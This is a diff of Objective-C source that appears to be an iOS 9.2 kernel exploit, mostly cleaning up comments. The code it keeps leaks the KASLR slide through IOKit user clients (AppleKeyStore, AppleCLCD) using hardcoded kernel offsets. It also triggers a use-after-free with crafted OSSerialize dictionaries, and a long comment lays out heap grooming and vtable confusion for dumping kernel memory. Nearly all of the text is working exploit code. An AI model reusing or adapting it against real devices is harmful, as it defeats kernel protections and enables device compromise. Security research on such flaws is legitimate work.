@@ -5,10 +5,7 @@
 //
 
 #import <UIKit/UIKit.h>
-//#include <stdio.h>
-//#include <stdlib.h>
 #include <sys/mman.h>
-
 #import <Foundation/Foundation.h>
 #import <sys/syscall.h>
 #import <dlfcn.h>
@@ -16,8 +13,6 @@
 #include <mach-o/dyld.h>
 #include <sys/mman.h>
 #include <mach/mach.h>
-
-//#include "librop.h"
 
 #include <IOKit/IOKitLib.h>
 #include <IOKit/iokitmig.h>
@@ -131,9 +126,6 @@ uint64_t * kslide_infoleak()
                // NSLog(@"In Here2");
                 memset(buffer,0, 0x200);
                 size=0x300;
-                //bcopy( bytes, buf, len ); in io_registry_entry_get_property_bytes()
-                //Use crafted OSNumber to leak stack information of the kernel
-                
                 
                 /*RM:
                  
@@ -146,9 +138,6 @@ uint64_t * kslide_infoleak()
                     //cacluate the kslide
                     kslide = *((unsigned long long*)&buffer[8])-0xffffff800453a000; //iOS 9.2  ip touch 6g is_io_get_properties_bytes() address hardcoded
                     NSLog(@"kslide=0x%llx\n",kslide);
-                   // NSLog(@"Slid OSString vtab** = 0x%llx\n",kslide+0xffffff80044f3168);
-                   // NSLog(@"SLID   text kernel base =0x%llx\n",kslide+0xffffff8004004000);
-
                     
                     break;
                 }
@@ -208,7 +197,6 @@ uint64_t kslide_infoleak5(void)
     } else
         return -1;
     
-    //serv = IOServiceGetMatchingService(master, IOServiceMatching("IOHDIXController"));
     serv = IOServiceGetMatchingService(master, IOServiceMatching("AppleKeyStore"));
 
     kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &err, &conn);
@@ -297,18 +285,9 @@ uint64_t kslide_infoleak3(void)
 
       io_iterator_t iterator;
     serv = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AppleCLCD"));
-   // IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("AppleCLCD"), &iterator); //IOSerialBSDClient
-    //serv = IOIteratorNext(iterator);
     NSLog(@"(+) IoServiceGetMAtchingService successful...\n");
     kr=io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict1, sizeof(dict1), &err, &conn);
-    //kr=io_service_open_extended(serv, mach_task_self(), 0, NDR_record, dict1, strlen(dict1)+1, &err, &conn);
 
-    //assert(err == KERN_SUCCESS);
-
-    //RM: AAAAH the error code returns kIOReturnNotPermitted............ #define kIOReturnNotPermitted    iokit_common_err(0x2e2) // not permitted
-    //RM:  kern_return_t io_service_open_extended
-  /*  
-   (mach_port_t service, task_t owningTask, uint32_t connect_type, NDR_record_t ndr, io_buf_ptr_t properties, mach_msg_type_number_t propertiesCnt, kern_return_t *result, mach_port_t *connection); */
     if ((err == KERN_SUCCESS)&& (kr== KERN_SUCCESS)) {
         NSLog(@"(+) UC successfully spawned! Leaking bytes...%x  %x\n",err, conn);
 
@@ -342,38 +321,10 @@ uint64_t kslide_infoleak3(void)
     io_buf_ptr_t buf_prop=NULL;
     mach_msg_type_number_t bufCnt = 0x200;
     
-    //RM: trying the set properties API
-   // kern_return_t outp;
-   // kr=io_registry_entry_set_properties(object,dict,bufCnt, &outp);
-   // if (kr == KERN_SUCCESS) {
-   //     NSLog(@"Successfully set property! %x\n\n\n",outp);
-   // }
-   // else{
-   //     NSLog(@"Couldnt set property %x %x\n\n\n", kr, outp);
-   // }
-    
-    
-    //RM:
+  
  
 do    {
-        //uint32_t size = sizeof(buf);
-        //if (IORegistryEntryGetProperty(object, "IOUserClientCreator", buf, &size) == 0)
-        //{
-   //RM:
-    //uint32_t size = sizeof(buf);
 
-    //RM:
-    //IORegistryEntryGetProperty(object, "IOUserClientCreator", buf, &size);
-    //memset(buf,0, 0x200);
-    //size=0x300;
-    
-    //RM: get the name *** experiment
-      /*  kern_return_t io_registry_entry_get_properties_bin
-        (
-         mach_port_t registry_entry,
-         io_buf_ptr_t *properties,
-         mach_msg_type_number_t *propertiesCnt
-         ); */
     kr= io_registry_entry_get_properties(object,&buf_prop,&bufCnt);
    // kr=io_registry_entry_get_name(object,buf_prop);
     if (kr == KERN_SUCCESS) {
@@ -401,32 +352,9 @@ do    {
             //return 0;
         }
 
-    /*
-    io_registry_entry_get_property_bytes
-    (
-     mach_port_t registry_entry,
-     io_name_t property_name,
-     io_struct_inband_t data,
-     mach_msg_type_number_t *dataCnt
-     ); 
-     */
-     
-        //IOObjectRelease(object);
         object = IOIteratorNext(iter);
             
 }while (object!=0);
-      //  IOObjectRelease(object);
-        //object = IOIteratorNext(iter);
-        
-    
-        //else
-    //{
-   // if (object!=0)
-     //   IOObjectRelease(object);
-    //NSLog(@"(+) Failed to read io_registry_entry_get_property_bytes !!!...%x\n",kr); //RM:  #define kIOReturnNoResources     iokit_common_err(0x2be) // resource shortage   why is it returning this???
-        //return -1;}
-
-    //return -1;
     
 #if 0
     for (uint32_t k = 0; k < 128; k += 8) {
@@ -486,8 +414,18 @@ void use_after_free(void)
     kern_return_t kr;
     
     /*
-     Plan: open lots of services via io_service_open_extended but with the dict only having a single string. Then free alternate string(by calling io_service_close) on multiple connections. this will hopefully cause the desired layout of |freed string| valid string|freed string| valid string|.....
-     Now do the regular uaf trigger by making another service with a dict with a string that will get freed and then trigger the retain call on this freed string(dont reallocate using OSdata). the vtab pointer of this freed string would actually be a next pointr in the kalloc.32 free list. the retain call would thus resolve to the actual vtab of a valid osstring(hopefully placed right after a freed string) because retain is vtab[4] which is 32 bytes from the start of the vtable * address. This *should* give you a kernel panic with pc/far pointing to the vtab of the actual valid string. this will be n the _DATA.const section.  of course you can calculate the unslid address be using the kaslr before this and subtracting the slide . next boot, just trigger kaslr, find the slide and add to the base address of the expected DATA.const vtab pointer for OSString class. use this vtab for that particular execution and trigger the normal UAF with OSData buffer containing the valid vtable and the char* of the string(confused as a member within OSData) to be pointing to the kernel base address+slide. and boom leak 4096 bytes at a time. (also set the length to 0xfff in OSdata i.e length of OSString's char * )
+     Plan: open lots of services via io_service_open_extended but with the dict only having a single string. 
+     Then free alternate string(by calling io_service_close) on multiple connections. this will hopefully cause 
+     the desired layout of |freed string| valid string|freed string| valid string|.....
+     Now do the regular uaf trigger by making another service with a dict with a string that will get freed and 
+     then trigger the retain call on this freed string(dont reallocate using OSdata). the vtab pointer of this freed 
+     string would actually be a next pointr in the kalloc.32 free list. the retain call would thus resolve to the actual vtab of a valid osstring(hopefully placed right after a freed string) because retain is vtab[4] which is 32 bytes from 
+     the start of the vtable * address. This *should* give you a kernel panic with pc/far pointing to the vtab of the 
+     actual valid string. this will be n the _DATA.const section.  of course you can calculate the unslid address be 
+     using the kaslr before this and subtracting the slide . next boot, just trigger kaslr, find the slide and add to 
+     the base address of the expected DATA.const vtab pointer for OSString class. use this vtab for that particular execution and trigger the normal UAF with OSData buffer containing the valid vtable and the char* of the 
+     string(confused as a member within OSData) to be pointing to the kernel base address+slide. and boom leak 
+     4096 bytes at a time. (also set the length to 0xfff in OSdata i.e length of OSString's char * )
      */
     
     
@@ -498,7 +436,6 @@ void use_after_free(void)
 
     //DICT for UAF Trigger
     /* create header */
-    
     
     memcpy(data1, kOSSerializeBinarySignature, sizeof(kOSSerializeBinarySignature));
     bufpos2 += sizeof(kOSSerializeBinarySignature);
@@ -515,9 +452,7 @@ void use_after_free(void)
     *(uint32_t *)(data1+bufpos2) = kOSSerializeEndCollection | kOSSerializeObject | 0x1; bufpos2 += 4;
 
     
-    //UAF trigger CODE BELOW
-  
-    
+    //UAF trigger CODE BELOW 
 
     //NSLog(@"Triggering the UAF...................... !\n");
    // usleep(4000);
@@ -607,8 +542,6 @@ void use_after_free1(uint64_t address, unsigned int bytes)
         kerntext_MSB = (address & 0xFFFFFFFF00000000) >> 32;
     }
     
-   // NSLog(@"OSString Kerntext %x %x %x %x \n", osstring_vtabLSB, osstring_vtabMSB, kerntext_LSB, kerntext_MSB );
-
 #define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0)
     
     WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning
@@ -646,33 +579,12 @@ void use_after_free1(uint64_t address, unsigned int bytes)
     
     host_get_io_master(mach_host_self(), &master); // get iokit master port
     
- /*   kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &res);
-    if (kr != KERN_SUCCESS)
-    {
-        NSLog(@"Error in dictionary %x %x\n\n\n", kr, res);
-        return;
-   }
-*/
-   // NSLog(@"Sleeping\n");
-   // sleep(2);   //async cleanup!!
 
     usleep(1000000);
 
     io_service_open_extended(service, mach_task_self(), 0, NDR_record, (char*)dict, idx, &err, &conn[0]);
 
-   // NSLog(@"Successfully opened service");
-    
-  //  NSLog(@"Error in UC Clinet is %x %x\n\n", err, conn[0]);
-
-    
-   /* if (kr!=0)
-    {
-        NSLog(@"Error in UC Clinet is %x %x\n\n", err, conn[0]);
-
-        NSLog(@"Cannot create service.\n");
-        return;
-    }
-  */
+ 
    // IORegistryEntryGetProperty(
    //                            io_registry_entry_t	entry,
    //                            const io_name_t		propertyName,
@@ -706,40 +618,9 @@ void use_after_free1(uint64_t address, unsigned int bytes)
         
         if (((kr = io_registry_entry_get_property_bytes(object, "CCC", buffer, &bytes))==0));  //RM: leak the number of bytes as dictated by the argument
         
-                //{
-                   
-                    
-                    /*for (uint32_t k = 0; k < 1900; k += 1) {
-                       // NSLog(@"%#llx\n", *(uint64_t *)(buffer + k));
-                        //NSLog(@"%x",*(uint8_t*)(buffer + k));
-                       //sprintf(temp, "%8llx",*((uint64_t *)(buffer + k)));
-                        //temp= *(uint32_t*)(buffer + k);
-                         //NSLog(@"%x\n",(temp));
-
-                       // usleep(1000);
-                        //RM: LOG INTO file in the local container in Documents/ folder. you can download this container via xcode devices and see the log file. The idea is to dump the kernel in this log file
-                        FILE * fp=NULL;
-                        fp = fopen(path, "ab+");
-                        if (fp ==NULL)
-                        {
-                            NSLog(@"Failed to open file !\n");
-                        }
-                        int cnt=0;
-                        cnt= fwrite ((uint8_t*)(buffer+k) , 1 , 1 , fp );
-                       if (cnt!=0)
-                       {
-                        //NSLog(@"Wrote %d bytes into the log file\n",cnt);
-                       //usleep(1000);
-                       }
-                        else
-                            NSLog(@"COULDNT WRITE BYTES!");
-                        fclose(fp);
-                        fp = NULL;
-                }
-               */     //cacluate the kslide
-               // }
-                else
-                    NSLog(@"Error in getting bytes %x",kr);
+  
+        else
+          NSLog(@"Error in getting bytes %x",kr);
            // }
         }
         
@@ -793,10 +674,8 @@ void use_after_free_backup(void)
     
     WRITE_IN(dict, (kOSSerializeSymbol | 4));   // symbol 'CCC'
     WRITE_IN(dict, (0x00434343));
-    
     WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeObject | 1));   // ref to object 1 (OSString)
-    
-
+ 
     
     NSLog(@"(+) All done! Triggering the bug!\n");
     
@@ -883,30 +762,7 @@ int main(int argc, const char * argv[]) {
         NSLog((@"HEADER COULDNT BE DUMPED..! QUITTING\n"));
         exit(0);
     }
-
-    //RM: calculate total kernel filesize as expected from the header
-/*
-    CMD_ITERATE(orig_hdr, cmd) {
-        switch(cmd->cmd) {
-            case LC_SEGMENT:
-            case LC_SEGMENT_64: {
-                seg = (struct segment_command_64*)cmd;
-                uint64_t filesize_temp=seg->filesize;
-                uint64_t fileoff=seg->fileoff;
-                uint64_t temp_addr=seg->vmaddr;
-                seg = (struct segment_command_64*)cmd;
-                seg = (struct segment_command_64*)cmd;
-                NSLog(@"[+] found segment.. %s\n", seg->segname);
-                NSLog(@"[*] Segment Name %s\n , segment address %llx\n file offset %llx segment size %llx\n\n",seg->segname,temp_addr,fileoff,filesize_temp);
-
-                 //filesize = max(filesize, seg->fileoff + seg->filesize);
-            }
-        }
-    }
- */
-   // NSLog(@"[*] Total Kernel FileSize is 0x%lx\n\n",filesize);
     
-    //uint8_t * kernel_dump=malloc(27792734); //buffer that will hold the rest of the kernel segments & sections after the header. Will write to the file at the end.
     uint8_t * kernel_dump=malloc(4096);
     memset(kernel_dump,0,4096);
     
@@ -974,10 +830,7 @@ int main(int argc, const char * argv[]) {
      hex(0xffffff800ecf3168-0xa800000)   --->hopefully this is the address of the vtab ** within DATA_Const of the kernel for OSString class.
      '0xffffff80044f3168'  0xa800000 is the slide for that execution    for siguza 0xffffff80044ef1f0 was the vtab ** but he was on 9.3.3 on a diff device.
      
-     
-     
-     
-     
+    
      */
     
     return 0;
